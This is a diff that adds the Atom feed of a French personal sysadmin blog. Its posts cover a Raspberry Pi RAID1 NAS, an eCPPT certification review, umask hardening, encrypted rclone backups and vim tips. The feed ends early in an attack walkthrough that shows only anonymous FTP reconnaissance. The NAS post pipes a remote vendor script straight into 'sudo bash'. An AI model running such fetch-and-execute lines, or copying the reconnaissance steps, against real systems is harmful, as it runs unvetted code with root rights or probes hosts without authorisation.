@@ -1,0 +1,2358 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+	<title>Un vieux site du jurassic H.</title>
+	<link href="https://jurassi.ch/atom.xml" rel="self" />
+	<updated>2023-09-13T21:16:45+02:00</updated>
+	<author>
+		<name>ebsd</name>
+	</author>
+	<id>tag:jurassi.ch,2020-05-23:default-atom-feed</id>
+	<entry>
+		<title>Home made  nas</title>
+		<content type="html">&lt;h1&gt;Home made  nas&lt;/h1&gt;
+&lt;blockquote&gt;&lt;p&gt;Ceci est obsolète, je n&#39;utilise plus de VPS, seulement des rpi.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;En complément de mon serveur VPS en ligne, j&#39;ai récemment acquis un &lt;strong&gt;Raspberry Pi 4&lt;/strong&gt; et un &lt;strong&gt;&lt;a href=&quot;https://wiki.radxa.com/Dual_Quad_SATA_HAT&quot;&gt;Quad Sata Hat&lt;/a&gt;&lt;/strong&gt;. Ce dernier permet de connecter jusqu&#39;à 4 disques SATA 2,5p au Raspberry Pi. Parfait pour un RAID qui sécurise mes données. Celles-ci sont synchronisées entre le VPS et le Pi via &lt;a href=&quot;https://syncthing.net&quot;&gt;Syncthing&lt;/a&gt;. Je dispose ensuite de backups incémentaux effectués sur les disques du RAID grâce à rsync. Voici quelques infos pour la mise en route du &lt;strong&gt;Quad Sata Hat&lt;/strong&gt; et d&#39;un RAID1 logiciel sous Raspbian. Pour l&#39;exercice, nous devons créer ce RAID mirroir sur 2 disques &lt;strong&gt;sans perdre les données déjà présentes&lt;/strong&gt; sur un des deux disques. Voici une modeste représentation visuelle de mon installation. &lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    &amp;lt;------+  CLOUD  +-----&amp;gt;             &amp;lt;---+ HOME +---&amp;gt;
+    rclone         ___                       ___
+    crypt         +===+     Syncthing       +===+
+    +-----------+ |VPS|  &amp;lt;---------------+&amp;gt; |Pi |
+    |             +___+                  |  +___+
+    |               ^                    |
+    |               | syncthing          |  ++ ++ 2 HDD    ++ ++ 2 HDD
+    v               |                    +&amp;gt; || || RAID1    || || RAID1
+    gdrive          v                       ++ ++          ++ ++
+                  Laptop                      +   rsnapshot  ^
+                                              +--------------+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Le Quad Sata Hat est disponible &lt;a href=&quot;https://shop.allnetchina.cn/products/dual-sata-hat-open-frame-for-raspberry-pi-4&quot;&gt;ici&lt;/a&gt;.&lt;/p&gt;
+&lt;h4&gt;Installation du Quad Sata HAT sur raspbian&lt;/h4&gt;
+&lt;p&gt;Script d&#39;installation :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;curl -sL https://rock.sh/get-rockpi-sata | sudo -E bash -
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On obtient un nouveau dossier :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/usr/bin/rockpi-sata
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Et un fichier de configuration, voir détails plus bas [1] &lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/etc/rockpi-sata.conf
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Comment créer un RAID1 dont 1 des 2 disques contient déjà mes donneés ?&lt;/h4&gt;
+&lt;p&gt;Je dispose de deux disques :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;/dev/sda = disque contenant mes données&lt;/li&gt;
+&lt;li&gt;/dev/sdb = nouveau disque vièrge&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;On installe les outils de gestion du RAID:
+&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+apt-get install mdadm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On démonte les disques :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;umount /mnt/disk1
+umount /mnt/disk2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On utilise sfdisk pour dupliquer la configuration des partitions du disque sda vers le disque sdb.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sfdisk -d /dev/sda | sfdisk /dev/sdb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Utilisons maintenant &lt;code&gt;mdadm&lt;/code&gt; pour créer un RAID1. On marque le premier disque sda comme &quot;manquant&quot; (missing) pour que les données du disque ne soient pas écrasées par la construction du RAID. Le second /dev/sdb1 est présent.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mdadm --create /dev/md0 --level 1 --raid-devices=2 missing /dev/sdb1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On formatte le nouveau RAID :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mkfs.ext4 /dev/md0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;On monte le RAID :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mkdir /mnt/raid1
+mount /dev/md0 /mnt/raid1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Copions le contenu du disque /dev/sda1 dans /dev/md0.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mount /dev/sda1 /mnt/disk1
+rsync -rtavz --delete /mnt/disk1/ /mnt/raid1/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Démontons le disque que nous allons ensuite activer dans le RAID1.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;umount /mnt/disk1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Inrégrer le disque 1 au RAID&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mdadm --add /dev/md0 /dev/sda1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Le RAID va se construire, ce que nous pouvons suivre ainsi :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cat /proc/mdstat
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;[1]: Fichier /etc/rockpi-sata.conf&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[fan]
+# When the temperature is above lv0 (35&#39;C), the fan at 25% power,
+# and lv1 at 50% power, lv2 at 75% power, lv3 at 100% power.
+# When the temperature is below lv0, the fan is turned off.
+# You can change these values if necessary.
+lv0 = 35
+lv1 = 40
+lv2 = 45
+lv3 = 50
+[key]
+# You can customize the function of the key, currently available functions are
+# slider: oled display next page
+# switch: fan turn on/off switch
+# reboot, poweroff
+# If you have any good suggestions for key functions, 
+# please add an issue on https://rock.sh/rockpi-sata
+click = slider
+twice = switch
+press = none
+[time]
+# twice: maximum time between double clicking (seconds)
+# press: long press time (seconds)
+twice = 0.7
+press = 1.8
+[slider]
+# Whether the oled auto display next page and the time interval (seconds)
+auto = true
+time = 10
+[oled]
+# Whether rotate the text of oled 180 degrees, whether use Fahrenheit
+rotate = false
+f-temp = false	
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Tags: raspberry, linux&lt;/p&gt;
+&lt;h2&gt;Restaurer les données du raid sur une autre machine&lt;/h2&gt;
+&lt;p&gt;Brancher le disque en usb sur un laptop, puis :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ sudo mdadm --examine /dev/sdb1 
+/dev/sdb1:
+          Magic : a92b4efc
+        Version : 1.2
+    Feature Map : 0x1
+     Array UUID : 3c2a5eff:d7455954:d77b1813:e27e8d72
+           Name : raspberrypi:0
+  Creation Time : Sat Feb  8 15:34:52 2020
+     Raid Level : raid1
+   Raid Devices : 2
+
+ Avail Dev Size : 976506928 (465.63 GiB 499.97 GB)
+     Array Size : 488253440 (465.63 GiB 499.97 GB)
+  Used Dev Size : 976506880 (465.63 GiB 499.97 GB)
+    Data Offset : 264192 sectors
+   Super Offset : 8 sectors
+   Unused Space : before=264112 sectors, after=48 sectors
+          State : clean
+    Device UUID : 32d73af4:2948dafd:90cb7742:bfaa2b58
+
+Internal Bitmap : 8 sectors from superblock
+    Update Time : Fri Dec 17 20:57:07 2021
+  Bad Block Log : 512 entries available at offset 16 sectors
+       Checksum : 61023788 - correct
+         Events : 21788
+
+
+   Device Role : Active device 0
+   Array State : AA (&#39;A&#39; == active, &#39;.&#39; == missing, &#39;R&#39; == replacing)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;Assemblage&lt;/h3&gt;
+&lt;p&gt;Je tente avec cette commande qui échoue.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ sudo mdadm --assemble /dev/md0 /dev/sdb1
+mdadm: /dev/sdb1 is busy - skipping
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Puis, assemblage automatique : Il existe déjà un RAID détecté dans /dev/md127.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ sudo mdadm --detail --scan
+INACTIVE-ARRAY /dev/md127 metadata=1.2 name=raspberrypi:0 UUID=3c2a5eff:d7455954:d77b1813:e27e8d72
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;$ cat /proc/mdstat 
+Personalities : 
+md127 : inactive sdb1[2](S)
+      488253464 blocks super 1.2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;   
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;unused devices: &amp;lt;none&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Mais impossible de monter le raid.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ sudo mount /dev/md127 /mnt/nas/
+mount: /mnt/nas: can&#39;t read superblock on /dev/md127.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Donc je stoppe le raid /dev/md127 qui semble avoir été créé automatiquement. Et je lance une détection auto. Un nouveau /dev/md/raspberry devient dispo.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ sudo mdadm --stop /dev/md127
+mdadm: stopped /dev/md127
+$ sudo  mdadm --assemble --scan
+mdadm: /dev/md/raspberrypi:0 has been started with 1 drive (out of 2).
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Et cette fois-ci je peux monter le raid :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ sudo mount /dev/md/raspberrypi\:0 /mnt/raid1
+&lt;/code&gt;&lt;/pre&gt;</content>
+		<link href="nas-maison-raspberry-pi4-quad-sata.html"/>
+		<id>tag:jurassi.ch,2023-09-12:posts/nas-maison-raspberry-pi4-quad-sata.md</id>
+		<published>2023-09-12T10:38:36+02:00</published>
+		<updated>2023-09-12T12:47:18+02:00</updated>
+	</entry>
+	<entry>
+		<title>[en] eCPPT course and exam review</title>
+		<content type="html">&lt;h1&gt;[en] eCPPT course and exam review&lt;/h1&gt;
+&lt;p&gt;I decided to write this [eCPPT][1] course review after passing the exam. It&#39;s a totally independent review, I have nothing to gain.&lt;/p&gt;
+&lt;h4&gt;Course&lt;/h4&gt;
+&lt;p&gt;eCPPT is a pentesting certification which will actually teach you skills through high quality courses and practical labs.
+You will learn : &lt;/p&gt;
+&lt;p&gt; - Penetration testing processes and methodologies
+ - WebApp security (vulnerability assessment, SQL Injections, LFI/RFI, XSS, CSRF)
+ - Network security (vulnerability assessment, performing attacks and pivoting, sniffing, poisoning,  privilege escalation and persistence)
+ - System security (especially Exploit Development)
+ - Wireless security (discover and attack)
+ - Advanced exploitation with ruby and metasploit&lt;/p&gt;
+&lt;p&gt;Moreover, you will learn how to elaborate a real profesionnal &lt;strong&gt;pentesting report&lt;/strong&gt; : this is very good point. It&#39;s not a question of how to caputre a flag. This is important if you want to join the infosec business : you will get advanced reporting skills&lt;/p&gt;
+&lt;p&gt;Note that manual and automated web application exploitation is taught which allow to really understand vulnerabilities, and not only use scripts or tools.&lt;/p&gt;
+&lt;p&gt;There are many slides and hours of videos. You will nerver be bored !&lt;/p&gt;
+&lt;p&gt;Of course you will learn the metasploit framework use. &lt;/p&gt;
+&lt;h4&gt;Labs&lt;/h4&gt;
+&lt;p&gt;To pass eCPPT you will not have to only learn theorical concepts and then answer multiple choice questions. You will have to get hands-on experience through the labs. This is the strenght of eCPPT.&lt;/p&gt;
+&lt;p&gt;Please note that the labs are oriented to skills you : forget about &quot;Capture The Flag&quot; in this course. I think this is a better orientation compared to others certifications.&lt;/p&gt;
+&lt;p&gt;You are &quot;alone&quot; in your labs virtual environment. You can reset a lab if things become wrong. All labs certifications do not allow it.&lt;/p&gt;
+&lt;h4&gt;Tools&lt;/h4&gt;
+&lt;p&gt;PPT course teach you how to use a large toolbox for scan, assess, exploit, post-exploit... During the exam, you will not be limited for the tools use.&lt;/p&gt;
+&lt;h4&gt;Exam&lt;/h4&gt;
+&lt;p&gt;First, I will not tell to much about the exam itself. I don&#39;t want to include exam spoilers. If you have done the labs, everything should be fine.
+If you fail, you&#39;ll have a second chance.&lt;/p&gt;
+&lt;p&gt;The exam consists of two parts : doing a real world pentest, and then writing a report. Each part lasts one week. An engagement is provided and indicate your scope and objectives.&lt;/p&gt;
+&lt;p&gt;I spent about 35 hours in the first part (I took few days off). Some targets are harder than others, and hardests can be demotivating : try again and again and take breaks !&lt;/p&gt;
+&lt;p&gt;For the repporting part, I recommend preparing a report support before starting the exam. Moreover don&#39;t forget to write notes and take screenshots of all what you could use in your report. You will have to organize all of your information, prepare a detailed analysis and provide remediation actions.&lt;/p&gt;
+&lt;h4&gt;Conclusion&lt;/h4&gt;
+&lt;p&gt;eCPPT will dive you into the penetration testing world. It provides high quality materials and good support thanks to the active forum where admins will always answer.&lt;/p&gt;
+&lt;p&gt;I loved the labs and the exam was really interesting as they reflect real company networks.&lt;/p&gt;
+&lt;p&gt;Before taking the exam, don&#39;t forget to prepare coffee and energy drinks, you will need them !&lt;/p&gt;
+&lt;p&gt;eCPPT was a very enjoyable experience !&lt;/p&gt;
+&lt;p&gt;[1]: https://www.elearnsecurity.com/certification/ecppt/&lt;/p&gt;
+&lt;p&gt;Tags: eCPPT, pentest&lt;/p&gt;</content>
+		<link href="ecppt-course-and-exam-review.html"/>
+		<id>tag:jurassi.ch,2023-09-11:posts/ecppt-course-and-exam-review.md</id>
+		<published>2023-09-11T19:01:55+02:00</published>
+		<updated>2023-09-11T19:01:55+02:00</updated>
+	</entry>
+	<entry>
+		<title>Configurer un umask + securisé</title>
+		<content type="html">&lt;h1&gt;Configurer un umask + securisé&lt;/h1&gt;
+&lt;p&gt;Je fais le point sur les différentes options de configuration du umask. Pour rendre les permissions de votre système plus restrictives, sans pour aurant bloquer tout son fonctionnement, le umask idéal est à mon sens le 027 ; l&#39;utilisateur peut lire et écrire, et le groupe peut seulement lire. Les autres utilisateurs ne possèdent pas de permissions.&lt;/p&gt;
+&lt;h2&gt;Quel est le Umask par defaut ?&lt;/h2&gt;
+&lt;p&gt;Pour cet article, nous utilisons une distribution redhat like.&lt;/p&gt;
+&lt;p&gt;Il existe de nombreux shell comme bash, ksh, zsh, et tcsh. Ces shells peuvent se comporter en tant que login shells et non login-shells. Le login shell est généralement appelé en ouvrant un terminal natif ou depuis une GUI.&lt;/p&gt;
+&lt;h3&gt;Login shell ou non-login shell ?&lt;/h3&gt;
+&lt;p&gt;Pour déterminer quel type de shell on exécute, utilisons la commande &lt;code&gt;echo $0&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Si la sortie de &lt;code&gt;echo $0&lt;/code&gt; retourne bash, alors c&#39;est un non-login shell qui est exécuté. La commande &lt;code&gt;sudo -s&lt;/code&gt; ne créé pas un login shell.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ echo $0
+bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Le umask par défaut pour un non-login shell est configuré dans /etc/bashrc.&lt;/p&gt;
+&lt;p&gt;Si la sortie de &lt;code&gt;echo $0&lt;/code&gt; retourne -bash, alors c&#39;est un login shell qui est utilisé. La commande &lt;code&gt;sudo su -&lt;/code&gt; créé un login shell par exemple.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# echo $0
+-bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Le umask par défaut pour un login shell est configuré dans /etc/profile.&lt;/p&gt;
+&lt;p&gt;Pour afficher le umask configuré par défaut pour un non-login shell :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ grep umask /etc/bashrc
+# By default, we want umask to get set. This sets it for non-login shell.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;   umask 002
+   umask 022
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Pour afficher le umask configuré par défaut pour un login shell :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ grep umask /etc/profile
+# By default, we want umask to get set. This sets it for login shell
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;   umask 002
+   umask 022
+   
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Configurer un umask plus restrictif&lt;/h2&gt;
+&lt;p&gt;Nous allons nous attacher aux login shells plus particulièrement.&lt;/p&gt;
+&lt;p&gt;Utilisons une valeur du umask plus sécurisée dans /etc/profile : umask 022 =&amp;gt; umask 027&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if [ $UID -gt 199 ] &amp;amp;&amp;amp; [ &amp;quot;/usr/bin/id -gn&amp;quot; = &amp;quot;/usr/bin/id -un&amp;quot; ]; then
+	umask 002
+else
+	umask 027
+fi
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En complément, on souhaite conserver un umask à 022 pour un utilisateur particulier :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ echo &#39;umask 022&#39; &amp;gt;&amp;gt; /home/username/.bashrc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Job Ansible&lt;/h2&gt;
+&lt;p&gt;Et voici une tâche ansible qui fait le job :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;- name: Set default umask 027 in /etc/profile for login shells
+  replace:
+    path: /etc/profile
+    regexp: &#39;(^\s+umask) (0[012][0-6])&#39;
+    replace: &#39;\1 027&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;- name: Set default umask 027 in /etc/login.defs for newly created home directories
+  replace:
+    path: /etc/login.defs
+    regexp: &#39;(umask|UMASK).+(0[012][0-6])&#39;
+    replace: &#39;\1 027&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;- name: Set mask 022 or set back to 022 if other umask already set for specific account
+  lineinfile:
+    dest: /home/username/.bashrc
+    state: present
+    regexp: &#39;^(umask|UMASK)&#39;
+    line: &#39;umask 022&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Tags: linux, security, umask, ansible&lt;/p&gt;</content>
+		<link href="configurer-un-umask-plus-securise.html"/>
+		<id>tag:jurassi.ch,2023-09-11:posts/configurer-un-umask-plus-securise.md</id>
+		<published>2023-09-11T19:01:55+02:00</published>
+		<updated>2023-09-11T19:01:55+02:00</updated>
+	</entry>
+	<entry>
+		<title>Chiffrer ses backups dans le cloud</title>
+		<content type="html">&lt;h1&gt;Chiffrer ses backups dans le cloud&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&quot;https://rclone.org/&quot;&gt;Rclone&lt;/a&gt; permet de synchroniser vos fichiers avec le cloud (Dropbox, Google drive, pcloud, Mega et bien d&#39;autres). C&#39;est idéal pour un backup en ligne. Pour assurer la confidentialité de nos données, utilisons en complément &lt;a href=&quot;https://nuetzlich.net/gocryptfs/&quot;&gt;gocryptfs&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Gocryptfs propose un mode &quot;reverse&quot; qui &quot;présente&quot; une vue chiffrée de vos données (et elles restent non chiffrées). Rclone peut ensuite être utilisé pour sauvegarder cette vue chiffrée de vos données, dans un serveur en ligne de votre choix.&lt;/p&gt;
+&lt;h2&gt;Initialiser la configuration &quot;reverse&quot; gocryptfs&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;-plaintextnames&lt;/code&gt; : option pour ne pas chiffrer les noms de fichiers, c&#39;est moins sécurisé mais plus simple pour restaurer un seul fichier !&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ umask 0077
+$ mkdir ~/.nobackup
+$ gocryptfs -reverse -aessiv -plaintextnames \
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;	-config ~/.nobackup/gocryptfs.reverse.rootfs.conf \
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;    -init ~/.nobackup/
+$ mkdir -p /tmp/remotebackup/rootfs
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;&quot;Monter&quot; la vue chiffrée dans un dossier&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;-extpass&lt;/code&gt;: option qui permet d&#39;obtenir la clé de chiffrement stockée dans votre gestionnaire de mots de passe favoris, &lt;a href=&quot;https://www.passwordstore.org/&quot;&gt;pass&lt;/a&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ gocryptfs -reverse -config ~/.nobackup/gocryptfs.reverse.rootfs.conf -exclude .nobackup/ -exclude /remotebackup/rootfs -fsname gcryptfs-reverse /home/ebsd /tmp/remotebackup/rootfs -extpass pass -extpass mypass/gocrypt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Maintenant les données visibles dans /tmp/remotebackup/rootfs sont indéchiffrables. C&#39;est la fameuse vue chiffrées de vos données.&lt;/p&gt;
+&lt;h2&gt;Full Backup de la vue chiffrée vers pcloud&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;--backup-dir&lt;/code&gt; permet de conserver la dernière version de chaque fichier remplacé, une assurance complémentaire.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# sync vers pcloud
+/usr/bin/rclone sync --update --verbose --transfers 30 --checkers 8 --contimeout 60s --timeout 300s --retries 3 --low-level-retries 10 --stats 2s &amp;quot;/tmp/remotebackup/rootfs&amp;quot; &amp;quot;rclone_pcloud:/ebsdhome/&amp;quot; --filter-from ~/rclone-filter
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;--filter-from&lt;/code&gt; permet de filtrer ce qui est uploadé, contenu du filtre &lt;code&gt;~/rclone-filter&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ cat rclone-filter 
+- /Documents/no_backup/**
++ /Documents/**
++ /sync/**
+- /.bashrc.d/**
++ .bashrc
++ .pandoc
++ /scripts/**
+- *
+- .*
+- .*/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Tags: backup, cloud, rclone, gocryptfs&lt;/p&gt;</content>
+		<link href="chiffrement-des-backups-dans-le-cloud.html"/>
+		<id>tag:jurassi.ch,2023-09-11:posts/chiffrement-des-backups-dans-le-cloud.md</id>
+		<published>2023-09-11T19:01:55+02:00</published>
+		<updated>2023-09-11T19:01:55+02:00</updated>
+	</entry>
+	<entry>
+		<title>Antisèche vim</title>
+		<content type="html">&lt;h1&gt;Antisèche vim&lt;/h1&gt;
+&lt;p&gt;Profitons de cette période de &lt;strong&gt;confinement&lt;/strong&gt; numéro 1 pour réviser.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Se déplacer au mot suivant : &lt;code&gt;w&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Se déplacer au mot précédant : &lt;code&gt;b&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Fin de ligne : &lt;code&gt;$&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Début de ligne : &lt;code&gt;^&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Aller à la ligne n : &lt;code&gt;nG&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Aller à la 1ere ligne : &lt;code&gt;1G&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Dernière : &lt;code&gt;G&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Undo : &lt;code&gt;u&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Joindre la ligne suivante à la ligne courrante : &lt;code&gt;J&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Numéro de ligne : &lt;code&gt;Ctrl-g&lt;/code&gt; ou &lt;code&gt;:set number&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Copier la sélection : &lt;code&gt;y&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Copier la ligne : &lt;code&gt;yy&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Copier n lignes : &lt;code&gt;nyy&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Copier le mot : &lt;code&gt;yw&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Copier n mots : &lt;code&gt;nyw&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Coller après le curseur : &lt;code&gt;p&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Coller avant le curseur &lt;code&gt;P&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Supprimer la ligne : &lt;code&gt;dd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Supprimer le reste de la ligne : &lt;code&gt;d$&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Supprimer depuis le début de la ligne : &lt;code&gt;d^&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Supprimer jusqu&#39;à la fin du fichier : &lt;code&gt;dG&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Supprimer depuis le début du fichier : &lt;code&gt;d1G&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Supprimer n lignes : &lt;code&gt;ndd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Supprimer n mots : &lt;code&gt;ndw&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Rechercher vers le bas : &lt;code&gt;/chaine&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Rechercher vers le haut : &lt;code&gt;?chaine&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Répéter la recherche : &lt;code&gt;n&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Repéter la recherche dans la direction inverse : &lt;code&gt;N&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Désactiver la sensibilité à la casse : &lt;code&gt;:set ignorecase&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;Un peu plus loin&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Supprimer les espaces à la fin de chaque ligne : &lt;code&gt;:%s/\s\+$//e&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Idem au début de chaque ligne : &lt;code&gt;:%s/^\s+//e&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Afficher un guide d&#39;indentation (tab) : &lt;code&gt;:set listchars=tab:\|\` puis  &lt;/code&gt;:set list&lt;code&gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Indenter (tabulation) un bloc de texte : sélectionner le texte avec &lt;code&gt;V&lt;/code&gt;, puis &lt;code&gt;jj&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Déplacer le curseur librement : &lt;code&gt;set virtualedit=all&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Tags: linux&lt;/p&gt;</content>
+		<link href="anti-seche-vim.html"/>
+		<id>tag:jurassi.ch,2023-09-11:posts/anti-seche-vim.md</id>
+		<published>2023-09-11T19:01:55+02:00</published>
+		<updated>2023-09-11T19:01:55+02:00</updated>
+	</entry>
+	<entry>
+		<title>Anatomie d'une attaque informatique</title>
+		<content type="html">&lt;h1&gt;Anatomie d&#39;une attaque informatique&lt;/h1&gt;
+&lt;p&gt;Au cours de cet article, je vous propose de décortiquer le processus d&#39;une attaque informatique à distance. Il s&#39;agit d&#39;un cas réel, pour lequel l&#39;entreprise a entrepris des actions correctives. Pour des raisons éthiques, toute information potentiellement sensible a été anonymisée ou supprimée.&lt;/p&gt;
+&lt;p&gt;Comme l&#39;indique le schéma ci-après, un attaquant (à droite et en rouge) connecté à internet, tente de s&#39;introduire sur le réseau de l&#39;entreprise (à gauche).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/20180217102110-attaque-informatique.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4&gt;Phase 1 - Découverte&lt;/h4&gt;
+&lt;p&gt;En premier lieu l&#39;attaquant va énumérer les services logiciels fournis par l&#39;entreprise sur internet. Bien souvent le management n&#39;a pas connaissance de l&#39;existence de ses services, et des risques encourus
+L&#39;attaquant découvre :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Un site internet&lt;/li&gt;
+&lt;li&gt;Un serveur de transfert de fichiers (FTP)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Le serveur FTP est accessible en mode &lt;em&gt;anonyme&lt;/em&gt;, ce qui permet une connexion sans pouvoir utiliser les fonctions de transfert de fichier. On peut considérer que le mode anonyme est &quot;sécurisé&quot;. Toutefois il permet d&#39;obtenir une information qui peut paraître anodine, mais qui a une grande importance pour la suite : le nom de compte d&#39;un utilisateur &quot;administrateur&quot; peut être découvert lors d&#39;une connexion anonyme.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;root@attaquant:~ $ ftp ftp.entreprise.fr
+Connected to ftp.entreprise.fr.
+220 xxx.xxx.xxx.xxx FTP server ready
+Name (ftp.entreprise.fr:root): anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password:
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; passive
+Passive mode on.
+&lt;/code&gt;&lt;/pre&gt;
